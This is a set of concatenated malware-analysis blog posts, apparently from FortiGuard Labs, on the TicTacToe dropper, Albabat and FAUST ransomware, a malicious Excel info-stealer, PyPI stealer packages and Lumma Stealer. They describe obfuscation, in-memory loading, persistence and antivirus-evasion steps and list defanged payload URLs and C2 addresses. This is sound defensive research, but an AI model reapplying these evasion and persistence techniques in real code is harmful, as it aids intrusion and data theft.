typically employed to avoid detection by antivirus software and as a mark-of-the-web (MOTW) bypass technique (T1553.005). The executable inside the iso had multiple layers of DLL files, which were extracted at runtime and loaded directly into memory. One layer of DLL was decoded at runtime, and the next layer of DLL was loaded and decoded by the previous layer of the DLL file. We will discuss the extraction of these obfuscated payloads in a later section. The extraction process is convoluted, so the diagram below should be referenced alongside the analysis to better understand the behavior of the dropper. We found that the same dropper has been used to distribute multiple final-stage remote access tools (RATs) for at least the last 12 months. This is shown in the following timeline diagram: To better understand the TicTacToe dropper, we performed static and dynamic analysis on several samples. The first TicTacToe dropper sample analyzed is a 32-bit executable developed in the .NET programming language called ‘ALco.exe’ (SHA-1 b6914b8fa3d0b67eb6173123652b7f0682cd24fb). Analysis of the sample identified that, on execution, the dropper extracts and loads a .NET PE DLL file directly into its current process using a runtime assembly object. This means the file is loaded directly into memory without being written to disk. The code associated with this in-memory loading can be seen in Figure 3. We then extracted the DLL at runtime and saved it as a separate file. This extracted DLL file was named ‘Hadval.dll’ in the OriginalFileName field in the file's version information. In this article, we will call this file ‘Hadval.dll’ or ‘stage2 payload’ for reference. This Hadval.dll file is a 32-bit .NET PE DLL file. This DLL file was obfuscated with version 4.1 of the DeepSea software, which differs from what was used to obfuscate the main executable (as yet undetermined). The DeepSea obfuscation resulted in unreadable function names and clear indicators of code flow obfuscation, as shown in Figure 2. Thede4dot toolwas used to subvert some of the DeepSea obfuscation. The de4dot tool is an open source (GPLv3) .NET de-obfuscator and unpacker written in C# that can often be used to restore a packed and obfuscated assembly to almost the original assembly. The de4dot tool detected that the file was obfuscated using the tool DeepSea 4.1 and then de-obfuscated much of the library to provide a cleaner version of the Hadval.dll file. We can see the output of the de4dot tool execution in Figure 5 and some of the cleaner, more readable code in Figure 6. Performing further debugging of the ‘ALco.exe’ process, we identified that the Hadval.dll code is used to extract a gzip blob. Decompressed, this gzip blob revealed another 32-bit PE DLL file and another .NET library. This stage 3 payload has the internal file name ‘cruiser.dll.’ This cruiser.dll was protected by software calledSmartAssembly, which is software provided by Redgate to protect .NET code from reverse engineering. This software claims to protect the source code of .NET applications through obfuscation and encryption and is designed to prevent intellectual property theft through code analysis. The tool ‘Detect It Easy’ shows this information, as seen in Figure 7. This cruiser.dll file was de-obfuscated using the de4dot tool to create a cleaned version of the binary DLL file. Following this de-obfuscation, we can see that the cruiser.dll file has a class named ‘Munoz.’ This class contains a function that creates a copy of the executable in the temp folder. This payload matches the description of a payload with the same name, ‘cruiser.dll,’ as described in Jai Minton's blog, where he analyzed it. We can see the code from the cleaned cruiser.dll file in Figure 8, including the ‘Munoz’ class. The code from the stage 3 DLL file (cruiser.dll) extracts, reflectively loads, and executes the stage 4 payload from the bitmap object ‘dZAu’ (a resource from the main payload). The stage 4 payload is another .NET PE DLL file with the internal name 'Farinell2.dll.’ It is obfuscated with a custom obfuscator. This stage 4 payload (Farinell2.dll) then de-obfuscates, reflectively loads, and executes the final payload. We have seen multiple variants of this dropper with different types of final payloads (e.g., Lokibot to gain credentials from numerous browsers and software in the victim machine, Remcos for remote access, etc.) Analyzing another TicTacToe dropper allows us to document some common characteristics within the malware group. This executable (SHA1: 15b3c9768a67ce0d09807627f1939c7165a3fede) was also a 32-bit .NET executable with the internal name ‘IxOQ.exe.’ This executable was not obfuscated but shares similarities with the above variant, i.e., later-stage obfuscated payloads embedded as object resources. This can be seen in the screenshot in Figure 9. The resource object has stored hexadecimal numbers as strings. A simple obfuscation was used while storing, which was to replace ‘0’ (zero) with ‘ZZ’ and replace ‘F’ with ‘YY.’ When the object string was being loaded, this string replacement was reversed to get the original hexadecimal string. This string was then converted to bytes and loaded as assembly code using the ‘Assembly.Load’ method. The resource object contents can be seen in Figure 10. When this string was de-obfuscated and extracted, it was found to be a 32-bit .NET PE DLL file like the previous sample. This stage 2 payload had the internal name of ‘Pendulum.dll.’ When the code inside ‘Pendulum.dll’ is executed, it extracts a stage 3 payload named ‘cruiser.dll.’ This is the same file name as the stage 3 payload DLL of the previous sample and uses the same loading process. This cruiser.dll extracts the stage 4 payload from the bitmap object ‘JqZn,’ a resource in the primary executable ‘lxOQ.exe.’ This and the previous sample executable files present similarly obfuscated image objects. These bitmap objects are visually similar between samples, as shown in Figure 11, where this and the last sample are compared. The payload extracted from the bitmap object was found to be another 32-bit .NET PE DLL file. This DLL file has the internal name of ‘Discompard.dll’. The code from this payload was also loaded reflectively, as in previous stage payloads. Multiple antivirus engines recognized this final payload (Discompard.dll) as the ‘Zusy Banking Trojan’ or ‘Leonem’. This ‘Zusy Trojan’ isalso known as‘TinyBanker’ or ‘Tinba’ by some researchers. We performed an analysis of another separate TicTacToe dropper sample, which drops AgentTesla malware. This executable (SHA1: af14b44a1bdbf96b8fec28236f152d410c91e807) was also a 32-bit .NET executable and also employs an identical technique to load code stored in the resource element of the file. This can be seen in Figure 12. When the resource object was checked, it was very similar to the resource object in the previous sample. It had stored hexadecimal numbers as strings, and the code used to obfuscate it was also similar, replacing ‘0’ (zero) with ‘ZZ’ and substituting ‘F’ with ‘YY.’ This is shown in Figure 13. The stage 2 payload has the internal name ‘Pendulum.dll,’ and the stage 3 payload has the name ‘cruiser.dll.’ On execution, the stage 3 payload extracts the stage 4 payload from the bitmap object ‘faLa.’ Again, the visual aspects of this embedded bitmap object match those discussed in the previous two samples. This can be seen in Figure 14. The final payload in this sample was detected as AgentTesla, a well-known RAT. In our search for any reporting on this dropper, we identified amalware analysis reportfrom Jai Minton. The second malware sample we analyzed had the same names as the payload DLL files, also as mentioned in Jai Minton’s blog. The only slight change was that the stage 2 payload was ‘Pend.dll’ in his analyzed sample, and in the second sample analyzed above, it was ‘Pendulum.dll.’ Names of other intermediate payloads (Cruiser.dll and Discompard.dll) match the payloads analyzed in Jai’s blog. In addition to these naming similarities, the dropper behavior exhibited by the sample outlined in Jai’s analysis is identical and results in the loading and execution of a Remcos executable. We analyzed multiple common characteristics in the different TicTacToe dropper samples. Here are some common characteristics: This dropper delivers multiple types of final payloads. As a result, we do not believe a single threat actor group uses this dropper. Instead, it is used as a tool that may be sold as a service to threat actors. We discovered that samples distributed at the beginning of 2023 contained the strings TicTacToe (Kolko_i_krzyzyk). Later campaigns had different unique strings common across the same campaigns but distributed different final-stage payloads. Some of the strings include: ‘MatrixEqualityTestDetail,’ ‘QuanLyCafe,’ ‘Pizza_Project,’ ‘Kakurasu,’ ‘BanHang_1’, ‘ChiuMartSAIS,’ etc. This indicates that the dropper tool is in constant development, and developers are trying to evade the string-based analysis of their malware dropper. By understanding the operation of this dropper and implementing solutions that can prevent its execution, organizations will be able to prevent the execution of a variety of final-stage payloads before they can be loaded. Since each iteration of the dropper contains a different final payload, each would have a different hash. As a result, while hash-based detections are still effective at mitigating known campaigns that employ this loader, a behavior-based endpoint security tool is required to detect new campaigns due to the dynamic nature of this malware. Multistage payload extraction and in-memory execution behaviors exhibited by this dropper are anomalous compared to normal application execution, and this type of behavior should be detected and blocked by EDR technology such as FortiEDR. The behavior discussed in this article outlines the behavior of the dropper component of analyzed samples rather than the final payload. Additional samples related to previous known campaigns involving this dropper can be found in VirusTotal by searching for ‘fortinet:MSIL/Kryptik.AIJY!tr OR fortinet:MSIL/GenKryptik.GLXZ!tr OR fortinet:MSIL/GenKryptik.GCRZ!tr’ or by browsing the public collection here:https://www.virustotal.com/gui/collection/a5a5b60edcbbb203cb1965b1d544b74c47284e015ffd50312de0a251141bfbd7/iocs. As highlighted above, the loader described in this report is used to deploy a variety of final payloads. Each of these final payloads is typically tracked byFortiGuard Antivirusseparately, but all instances of this loader can be tracked through the following trackers: MSIL/Kryptik.AIJY!trMSIL/GenKryptik.GLXZ!trMSIL/GenKryptik.GCRZ!tr FortiEDRblocks the reflective loading behavior of this loader, preventing it from loading its final-stage payload. FortiEDR is also able to extract in-memory loaded artifacts to assist with triaging an infection by this dropper. We also suggest that organizations go through Fortinet’s freeFortinet Certified Fundamentals (FCF)in cybersecurity training. The training is designed to help end users learn about today's threat landscape and will introduce basic cybersecurity concepts and technology.

    "link": "https://www.fortinet.com/blog/threat-research/python-info-stealer-malicious-excel-document",
    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The stolen information can be used for future attackSeverity Level:High In January 2024, FortiGuard Labs obtained an Excel document distributing an info-stealer. From the fingerprints in this attack, it is related to a Vietnamese-based group that wasfirst reportedon in August 2023 andagainin September. The attack stages before the info-stealer are simple downloaders that increase the difficulty of detection. This article introduces each stage in this attack and provides a glimpse into the world behind the malware campaign. The first stage of this attack is an Excel document with a VBA script that executes a PowerShell command to download a Windows Update.bat from filebin.net. Figure 3 is a screenshot of the Windows Update.bat, protected by the Abobus obfuscator. Obfuscations such as variables whose names contain non-English characters and “^” escape characters are inserted into the original code. Additionally, variable expansions (%variable:~start,length% )were used to replace the alphabet in the original code. Figure 4 is the malicious part of the original code, which downloads and executes test.vbs in the next stage. Test.vbs is roughly the same as the middle stage of the campaign reported in August 2023. It downloads three files: script.py Information stealer. Document.zip Python 3.11 with libraries for script.py. bypass.vbs Executes script.py with the downloaded Python. Script.py is obfuscated by PyObfuscate, which means it needs extra modules to be executed properly. Document.zip is downloaded to solve this problem. In addition, test.vbs creates a value named “WinUpdater” within the registry key HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run to automatically run bypass.vbs when the victim logs in. Unlike the info-stealer described in the August 2023 report, script.py only collects browsers' cookies and login data. It extracts data from a wide range of browsers, from familiar browsers such as Chrome and Edge to browsers focused on the local market, like the Cốc Cốc browser. The collected data is compressed into a zip file, which will be sent to the attacker’s telegram bot with a message containing the date, victim’s country, IP address, language, password count, and cookie count. Furthermore, a watermark in the message sent to the bot links to a telegram channel that provides hacking tools and sensitive information. Though it is not directly relevant to this campaign group, it still gives a fresh example of how stolen information is spread. As we mentioned, many stages of this attack are downloaded from an open platform. This gives us a chance to gather more information about this hacker group. Apart from the files in the infection vectors, files sharing several commonalities with this campaign were also uploaded. For example, obfuscated batch files and VBScript files executing PowerShell code whose code is identical to Windows Update.bat and test.vbs. From those downloaders, we found more repositories related to this hacker group. In addition, there is malware probably used in other campaigns loaded on the repositories, including XWorm, VenomRat, RedLine, etc. We also found clues to another campaign from the telegram bot that receives the victim’s information. As Figure 10 shows, the threat actor cheated the victim into enabling macros in a Word document named “done 300coki.docm.” Though we couldn’t obtain the file named in Figure 10, the file name dropped a hint that they used cookies as a lure. Moreover, we found another Word document containing Facebook cookies and a malicious macro in the chat history. Like the Excel document we mentioned previously, the macro downloads an obfuscated batch file, which downloads the next stage of the attack. However, the infection vector was divided into more pieces, as Figure 12 shows. The dll files are extracted from image files. The data is base64-encoded and appended to a jpg file. The payload is XWorm, which we also found variants of on the GitHub repositories mentioned in the Abused Open Platforms section. The threat actors separate the malware campaign into several simple downloaders and use open platforms to avoid detection. However, this also provided clues to identify the hacker group. From the information left in the files, we also found files abused in other campaigns and the SNS platforms being abused to distribute malware. Such services not only provide a convenient environment for people but are commonly used by threat actors. The malware described in this report are detected and blocked byFortiGuard Antivirusas: VBA/Agent.ZCI!trMSIL/Injector.UWS!trVBA/Agent.4C99!tr.dldrVBS/Agent.HLI!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. TheFortiGuard CDR(content disarm and reconstruction) service can disarm the malicious macros in the document. We also suggest that organizations go through Fortinet’s freeFortinet Certified Fundamentals (FCF)in cybersecurity training. The training is designed to help end users learn about today's threat landscape and will introduce basic cybersecurity concepts and technology. FortiGuard IP ReputationandAnti-Botnet Security Serviceproactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources.

    "title": "Ransomware Roundup - Albabat",
    "link": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-albabat",
    "content": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the Albabat ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Encrypts victims' files and demands ransom for file decryptionSeverity level:High Albabat, also known as White Bat, is a financially motivated ransomware variant written in Rust that identifies and encrypts files important to the user and demands a ransom to release them. It first appeared in November 2023 with the variant Version 0.1.0. Version 0.3.0 was released in late December, followed by version 0.3.3 in mid-January 2024. The Albabat ransomware appears to be distributed as rogue software, such as a fake Windows 10 digital activation tool and a cheat program for the Counter-Strike 2 game. The Albabat ransomware samples were submitted to a publicly available file scanning service, and it appears to be primarily targeting companies and individuals in Argentina, Brazil, the Czech Republic, Germany, Hungary, Kazakhstan, Russia, and the United States. But because it is being distributed as fake software, the ransomware can affect anyone. Once the Albabat ransomware is executed, it looks for files to encrypt. It avoids encrypting the following file types: N2PK abbt arc arz bik bin bk2 cab cat cur dat desktop dll inf ini lib lnk log mp2 msi nfo otf pdb pkg pkr pyd qt resource sfx sig so swf tcl tmp ttf url vc vdf vfont vpk whl win wma woff woff2 xnb Additional file types listed below are excluded from encryption in versions 0.3.0 and 0.3.3: CHK _pth cmd com icls ico idx mod mp3 ogg pickle src theme vhdx vscdb ~$ dic lock mui pyc smc srm Note that the file types highlighted in light green are excluded in version 0.3.0. The file types highlighted in light yellow are additional files excluded in version 0.3.3. Files encrypted by the Albabat ransomware are given a “.abbt” file extension. The ransomware also replaces the desktop wallpaper with its own. The Albabat ransomware’s wallpaper claims it supports Windows and Linux platforms. However, we have not been able to locate Linux samples. Since the ransomware is written in the Rust language, which can be cross-compiled from one operating system to another, it's possible that a Linux version will be released in the future. Version 0.1.0 tries to terminate Chrome.exe. Starting with version 0.3.0, the ransomware also attempts to terminate the following additional processes: taskmgr.exe code.exe excel.exe powerpnt.exe winword.exe msaccess.exe mspub.exe chrome.exe cs2.exe (the game Counter Strike 2) steam.exe onedrive.exe postgres.exe mysqlworkbench.exe outlook.exe windowsterminal.exe sublime_text.exe Version 0.3.0 and later also stops the following services: MySQL57 MySQL80 MySQL82 postgresql-x64-14 postgresql-x64-15 Starting with version 0.3.0, the ransomware may steal from or modify the following files: AppData\\Roaming\\Electrum\\wallets AppData\\Roaming\\JetBrains AppData\\Local\\Microsoft\\OneDrive C:\\Program Files (x86)\\Steam\\steamapps\\common\\Counter-Strike Global Offensive\\game\\csgo\\cfg D:\\Games\\steamapps\\common\\Counter-Strike Global Offensive\\game\\csgo\\cfg D:\\Steam\\steamapps\\common\\Counter-Strike Global Offensive\\game\\csgo\\cfg Version 0.3.3 adds the following entries to the Windows Hosts file to block access to certain sites: Once the encryption process is finished, the ransomware drops the following files: Version 0.1.0 Version 0.3.0 Version 0.3.3 The README.html file is a ransom note instructing victims to email the attacker. It demands 0.0015 Bitcoin (approximately $64 US) for file decryption. The ransom notes dropped by versions 0.1.0, 0.3.0, and 0.3.3 are significantly different except for the format. The ransom note has a translation option that uses the Google Translate service, allowing it to be translated into over 100 languages. When the translation option is selected, Portuguese is automatically selected as the translation language, which may indicate that this is the primary language of the ransomware developer. Files larger than 5MB were not encrypted in our test environments, as per the ransom note. The FAQ option opens FAQ.html, which does not differ much between variants except for item 10, which was added in version 0.3.0. The attacker’s Bitcoin wallet had no transactions at the time of our investigation. Although one of the Albabat ransomware samples instructs victims to visit a TOR site, the site was no longer accessible at the time of our investigation. Since there is no mention of data exfiltration in the ransom notes, it is likely that the TOR site was only used for ransom negotiations. Fortinet customers are already protected from this malware variant through our AntiVirus and FortiEDR services, as follows: FortiGuard Labs detects the Albabat ransomware samples with the following AV signatures: TheFortiGuard AntiVirus serviceis supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected.

Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREEFortinet Certified Fundamentals (FCF)in Cybersecurity training. The training is designed to help end users learn about today's threat landscape and will introduce basic cybersecurity concepts and technology. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. FortiReconis a SaaS based Digital Risk Prevention Service backed by cybersecurity experts to provide unrivaled threat intelligence on the latest threat actor activity across the dark web, providing a rich understanding of threat actors’ motivations and TTPs. The service can detect evidence of attacks in progress allowing customers to rapidly respond to and shut down active threats. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aUS Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. OurIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Additionally,FortiRecon Digital Risk Protection (DRP)is a SaaS-based service that provides a view of what adversaries are seeing, doing, and planning to help you counter attacks at the reconnaissance phase and significantly reduce the risk, time, and cost of later-stage threat mitigation.

    "title": "Another Phobos Ransomware Variant Launches Attack – FAUST",
    "link": "https://www.fortinet.com/blog/threat-research/phobos-ransomware-variant-launches-attack-faust",
    "content": "FortiGuard Labs Threat Research The Phobos ransomware family is a notorious group of malicious software designed to encrypt files on a victim's computer. It emerged in 2019 and has since been involved in numerous cyber attacks. This ransomware typically appends encrypted files with a unique extension and demands a ransom payment in cryptocurrency for the decryption key. FortiGuard Labs has captured and reported on several ransomware variants from the Phobos family, includingEKINGand8Base. Recently, FortiGuard Labs uncovered an Office document containing a VBA script aimed at propagating the FAUST ransomware, another variant of Phobos. The attackers utilized the Gitea service to store several files encoded in Base64, each carrying a malicious binary. When these files are injected into a system's memory, they initiate a file encryption attack. Figure 1 shows the attack chain. In this blog, we explore the different phases of file deployment and delve into the details of the delivered malware. The XLAM document we discovered contains an embedded VBA script, as illustrated in Figure 2. Upon opening the document, the script triggers PowerShell for the next stage using the “Workbook_Open()” function. It then downloads Base64-encoded data from Gitea, which can be decoded into a clean XLSX file. This file is then saved in the TEMP folder and automatically opened, misleading users into thinking the process is completed and poses no harm. Figure 3 displays the decoded code retrieved from the variable “SkSLjvNc.” The PowerShell script downloads data from hxxps://gitea[.]com/JoinPokingo/JingaPol/raw/branch/main/cfmifs_CRPT[.]txt, extracts the targeted malicious section in “cfmifs_CRPT[.]txt” using the pattern “DICK{(.*)}DICK” and decodes the result from Base64, which is shown in Figure 4. Lastly, a random folder is selected within “$env:APPDATA..\\Local,” and two randomly generated characters are appended to the folder name, giving it a new name. The executable, “AVG update.exe,” is saved in this new folder, as shown in Figure 5. The executable file “AVG update.exe” functions as a downloader. It incorporates an abundance of extraneous code to evade detection and complicate analysis. Employing a process injection technique, it allocates Read-Write-Execute (RWE) memory to inject the malicious code into a newly generated process. Additionally, the file encodes all its strings and XORs them with specific hexadecimal keys before utilization. Figure 6 shows the assembly code for obtaining a DLL name from the encoded string “blogaudit” utilizing XOR hex keys. “blogauditblo” ^ 0x29293d292439575B5A262023 = “KERNEL32.DLL” It encompasses the following functions: The attacker allocates a section within the target process's memory, inserts malicious code, and calls to the payload's entry point. FAUST Ransomware is a variant of the Phobos family, a type of malware that encrypts the files on the victim's computer. It demands a ransom in exchange for providing a decryption key. This ransomware appends the \".faust\" extension to each encrypted file and generates info.txt and info.hta within the directories housing the encrypted files. These files serve as a means to establish contact with the attackers for ransom negotiations. It checks the Mutex object to ensure only one process is running, and it adds persistence by adding a registry to “HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run “ and copying itself to two folders: “%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup and “C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup.” These folders are associated with the Windows startup configuration. The former is user-specific, launching programs at user login, while the latter is system-wide, affecting all users during system startup. They are crucial for automatically running the FAUST Ransomware. To avoid destroying the system, double-encrypting files, or encrypting its ransom information, it contains an exclusion list: Like the typical behavior of Phobos variants, FAUST ransomware keeps the decryption function for configuration. Take the exclusion list, for example. It uses the index 7 for file extensions, 8 for filenames, and 9 for directories. It also initiates multiple threads to perform various tasks. These tasks include deploying encryption, scanning logical drives, searching for network/sharing resources, scanning files individually, and explicitly seeking database-related files (such as fdb, sql, 4dd, 4dl, abs, abx, accdb, accdc, accde, adb, adf, ckp, db, db-journal, db-shm, db-wal, db2, db3, dbc, dbf, dbs, dbt, dbv, dcb, dp1, eco, edb, epim, fcd, gdb, mdb, mdf, ldf, myd, ndf, nwdb, nyf, sqlitedb, sqlite3, and sqlite). The encrypted files carry the extension “.id[<<ID>>-3512].[babylon4367@proton.me].faust.” It also launches the HTML version of the ransom note, “info.hta,” on the victim’s device. Figure 13 shows the message instructing victims to contact the attackers via email, using the specific ID as the message's title, or through a TOX message. By inspecting the TOX ID, we found that the original seller initiated the selling process in November 2023, as shown in Figure 14. Notably, the selling activity is ongoing, and users should remain vigilant against this ongoing threat. This report delved into the FAUST variant of the Phobos ransomware, providing insights into the process of downloading the payload file from an MS Excel document embedded with VBA script. Our analysis uncovered a threat actor employing a fileless attack to deploy shellcode, injecting the final FAUST payload into the victim's system. The FAUST variant exhibits the ability to maintain persistence in an environment and creates multiple threads for efficient execution.

    "link": "https://www.fortinet.com/blog/threat-research/info-stealing-packages-hidden-in-pypi",
    "content": "FortiGuard Labs Threat Research Affected platforms:All platforms where PyPI packages can be installedImpacted parties:Any individuals or institutions that have these malicious packages installedImpact:Leak of credentials, sensitive information, etc.Severity level:High The Python Package Index (PyPI) is an open repository of software packages developed by the Python community to help people quickly develop or update applications. While most of the packages uploaded to PyPI are posted by dedicated individuals looking to support the Python community, threat actors also regularly post packages infected with malware. The FortiGuard Labs team uses a proprietary, AI-driven OSS malware detection system to hunt for and monitor these threats. Recently, we identified a PyPI malware author (who goes by the ID “WS”) discreetly uploading malicious packages to PyPI. We now estimate that there may be well over 2000 victims of “WS” just from the packages described below alone. The identified packages—nigpal, figflix, telerer, seGMM, fbdebug, sGMM, myGens, NewGends, and TestLibs111—exhibit attack methodologies similar to those outlined in a Checkmarxblog postpublished four months ago. The similarity suggests a possible connection to a malicious campaign from early 2023. Notably, these packages incorporate base64-encoded source code of PE or other Python scripts within their setup.py files. Depending on the victim devices’ operating system, the final malicious payload is dropped and executed when these Python packages are installed. A brief timeline of our findings about this info-stealing author is detailed below. The packages released before December 2023 are very similar to those discussed in earlier blog posts. Specifically, they deploy Whitesnake PE malware if the victim’s device runs on Windows, or they can deliver a Python script designed to steal information from Linux devices. A subtle distinction lies in the new method now being used by the Python script to transmit stolen data. Instead of relying on a single fixed URL, these new malware variants use a range of IP addresses as the destination, likely to ensure successful data transmission even if one server fails. Given the strong resemblance of these new packages to the previous ones, we will focus on analyzing the payloads from these more recent variants. Unlike earlier attacks that targeted both Windows and Linux users, this recent set of packages predominantly targets Windows users. While the executable payload for each package varies slightly from one another, they consistently aim to exfiltrate sensitive information from victims. Let’s take a brief look at a few of these payloads. Unlike the previous Whitesnake PE payloads developed using .NET, this sample manifests as a Python-compiled executable crafted using the PyInstaller tool. Upon careful examination of its contents post-extraction, the primary script file is revealed as 'main.pyc' accompanied by an 'addresses.py' counterpart. The mere presence of this counterpart raises suspicions. Upon decompiling 'main.pyc,' we can see that the code is somewhat incomplete, accentuating its clandestine nature. Red flags include copying itself to the Windows startup folder for autorun on startup. The script also probes logical drives, endeavoring to copy itself into non-removable drives. Notably, it adopts a discreet strategy by monitoring the count of its running instances, ensuring an inconspicuous profile complete with an exit strategy if the count surpasses two. Finally, the script retrieves the clipboard contents and compares them against predefined cryptocurrency address patterns. The discovery of matching patterns prompts the script to overwrite the clipboard with corresponding addresses sourced from 'addresses.py.' This could deceive unsuspecting victims into directing things like cryptocurrency transactions to an unexpected destination. This payload is an encrypted .NET executable. Upon being installed on the user’s device, the payload launches an invisible window of “cmd.exe.” It then uses \"powershell.exe\" through this window to add itself to the Windows Defender’s exclusion list to bypass the built-in security response: It then copies itself to the Windows Application folder and creates a scheduled task to run itself every hour once the device is infected: Each time the task runs, it establishes a connection to the malicious IP: 194[.]36[.]177[.]30. It uses “socket.io” to connect the server to the client. This way, if the connection is lost, it will automatically try to reconnect. The core of this payload tries to collect user information, such as the user’s IP address, the host credentials, etc.: The following strings offer more compelling evidence of the information-stealing capabilities of this payload. They reveal that the payload not only captures mouse and keyboard interactions but also acquires and transmits wallet and browser data to the remote server. Once this sample runs, we can observe data being sent to a suspicious IP address (194[.]36[.]177[.]30), as shown in Figure 12. At first glance, we might dismiss these as inconspicuous strings. However, further investigation shows this to be a .zip file shrouded in multiple layers of encryption. This raises serious concerns about its behavior. Upon decryption, we see 'PK' as the initial bytes, indicating a .zip file format. After debugging this sample, there are several indicators as to what sensitive content it may be interested in. Below are a few of the many interesting strings that were found during our analysis. Some of these strings may indicate info-stealing from different services, such as browsers, applications, and cryptocurrency services. Some examples we found included Chrome, Discord, Filezilla, and Coinbase. When we extract the .zip file, we can see some of the collected content. The author then exfiltrates this sensitive information to the server. This blog demonstrates the ability of a single malware author to disseminate numerous info-stealing malware packages into the PyPI library over time, each featuring distinct payload intricacies. Users are urged to exercise utmost caution when using open-source packages, checking for malicious content or payloads that may render targeted devices susceptible to information theft. The narrative of this particular malware author has unfolded over several months and showcases the considerable amount of havoc that has been wrought. Information-stealing malware is an increasingly pertinent and pressing subject. Safeguarding against such persistent adversaries demands a strategic and forward-thinking approach to fortify your defenses.

    "title": "Deceptive Cracked Software Spreads Lumma Variant on YouTube",
    "link": "https://www.fortinet.com/blog/threat-research/lumma-variant-on-youtube",
    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The information collected can be used for future attacksSeverity Level:High FortiGuard Labs recently discovered a threat group using YouTube channels to distribute a Lumma Stealer variant. We found and reported on a similar attack method via YouTube inMarch 2023. These YouTube videos typically feature content related to cracked applications, presenting users with similar installation guides and incorporating malicious URLs often shortened using services like TinyURL and Cuttly. To circumvent straightforward web filter blacklists, the attackers exploit open-source platforms like GitHub and MediaFire instead of deploying their malicious servers. In this case, the shared links lead to the direct download of a new private .NET loader responsible for fetching the final malware, Lumma Stealer. Lumma Stealer targets sensitive information, including user credentials, system details, browser data, and extensions. It has been advertised on the dark web and a Telegram channel since 2022, with over a dozen observed command-and-control (C2) servers in the wild and multiple updates. Figure 1 shows Lumma Stealer's C2 server telemetry, illustrating a global presence with a peak observed in December. In this article, we will elaborate on each stage's behaviors that facilitated the stealer's distribution. The hacker initially breaches a YouTuber's account and uploads videos masquerading as sharing cracked software. Figure 3 shows the video descriptions in which a malicious URL is embedded, enticing users to download a ZIP file that harbors malicious content for the next stage of the attack. The videos were uploaded earlier this year, but the files on the file-sharing site receive regular updates (Figure 4), and the number of downloads keeps growing. This indicates that the ZIP file is always new and that this method effectively spreads malware. The ZIP file, “installer_Full_Version_V.1f2.zip,” contains an LNK file that calls PowerShell to download a .NET execution file via the GitHub repository “New” owned by John1323456 (Figure 6). The abbreviated URL, “hxxp://cutt[.]ly/lwD7B7lp,” connects to “hxxps://github[.]com/John1323456/New/raw/main/Installer-Install-2023_v0y.6.6[.]exe.” The other two repositories, “LNK” and “LNK-Ex,” also include NET loaders and spread InfoStealer as the final payload. The private .NET loader is obfuscated with SmartAssembly. It first gets the system’s environment value, shown in Figure 7. Once the number of the data is correct, it proceeds to load the PowerShell script. Otherwise, it exits the program. Figure 8 shows the construction of a dictionary that defines the following properties of the ProcessStartInfo object that the malicious code uses to execute discreetly and avoid raising suspicion from its victims: Next, the ProcessStartInfo object is employed to launch the PowerShell process, wherein the PowerShell script is directed to the process's standard input. Figure 9 illustrates a portion of the code and the newly generated process. Figure 10 shows the partial PowerShell code from the private .NET loader. The script encodes the server IP address in Base64 and encompasses four servers. It assesses the system date, choosing the appropriate IP to retrieve encrypted binary data. To obfuscate analysis, the script incorporates a substantial amount of extraneous code. Figure 11 shows captured traffic downloaded from the first server, 176[.]113[.]115[.]224:29983. After receiving the data, the script decrypts it using AES CBC, followed by GZip decompression to obtain the DLL file for the next stage. It then invokes the DLL file with a specific method and type via “[System.Reflection.Assembly]::Load(),” as shown in Figure 12. Figure 13 shows the targeted function “PerkyRiggal,” which is pivotal in inspecting the system and environment. It employs several PNG files in the Resources section to decipher the ultimate payload of Lumma Stealer. To avoid detection, the file encodes all its strings using the \"BygoLarchen\" method. Figure 14 demonstrates the function of decoding the target text with a predefined key string. It checks the following items to achieve Anti-VM and Anti-Debug: After completing all environment checks, the program decrypts the resource data and invokes the \"SuspendThread\" function. This function is employed to transition the thread into a \"suspended\" state, a crucial step in the process of payload injection (see Figure 